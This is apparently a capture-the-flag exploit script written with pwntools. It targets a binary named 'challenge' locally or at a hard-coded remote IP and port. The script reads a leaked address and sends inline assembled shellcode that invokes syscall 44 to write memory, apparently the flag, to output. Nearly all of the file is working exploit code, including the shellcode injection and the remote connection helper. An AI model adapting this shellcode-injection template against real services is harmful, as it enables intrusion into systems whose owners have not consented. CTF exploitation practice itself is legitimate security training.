from pwn import *
from icecream import ic

elf = exe = ELF("./challenge")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'amd64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("152.69.210.130", 3001)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+374
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()
ru("Some gift for you: ")
leak = int(rl().strip(), 16)

payload = asm(f'''
    mov rdi, 1
    add rdx, 0x1000
    mov rsi, rdx
    mov rdx, 100
    mov r10, 0
    mov r8, 0
    mov r9, 0
    mov rax, 44
    syscall
''')


sl(payload)

io.interactive()